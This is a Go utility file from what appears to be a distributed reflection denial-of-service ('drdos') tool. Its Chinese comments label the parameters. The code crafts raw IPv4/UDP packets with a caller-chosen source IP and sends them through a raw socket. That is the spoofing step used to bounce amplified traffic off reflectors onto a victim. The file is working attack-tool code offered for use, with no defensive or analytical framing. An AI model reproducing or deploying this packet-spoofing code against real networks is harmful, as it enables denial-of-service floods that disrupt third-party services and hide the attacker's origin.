package utils

import (
	"drdos/config"
	"log"
	"net"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// Packet 第一个是远程，第二个是本地，第三个是本地端口，第四个远程端口，第五个payload
func packet(raddr string, saddr string, dport layers.UDPPort, sport layers.UDPPort, payload []byte) []byte {
	ip := &layers.IPv4{
		Version:  0x4,
		TOS:      0x0,
		TTL:      0x40,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    net.ParseIP(saddr),
		DstIP:    net.ParseIP(raddr),
	}
	udp := &layers.UDP{
		SrcPort: sport,
		DstPort: dport,
	}
	udp.SetNetworkLayerForChecksum(ip)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{true, true}
	check(gopacket.SerializeLayers(buf, opts, ip, udp, gopacket.Payload(payload)))
	return buf.Bytes()
}

func to4Array(raddr net.IP) (raddrb [4]byte) {
	copy(raddrb[:], raddr.To4())
	return
}

func check(err error) {
	if err != nil {
		log.Print(err)
		time.Sleep(10 * time.Millisecond)
	}
}

// 发送udp包,
// dstip		目标IP
// srcip		本机公网IP
// dport		目标port
// sport		本机port
// payload		发送载荷
func SendUdpPack(dstip string, srcip string, dport int, sport int, payload []byte) error {
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	addr := syscall.SockaddrInet4{
		Port: config.ListenPort,
		Addr: to4Array(net.ParseIP(dstip)),
	}
	p := packet(dstip, srcip, layers.UDPPort(dport), layers.UDPPort(sport), payload)
	err := syscall.Sendto(fd, p, 0, &addr)
	if err != nil {
		return err
	}
	err = syscall.Close(fd)
	if err != nil {
		return err
	}
	return nil
}
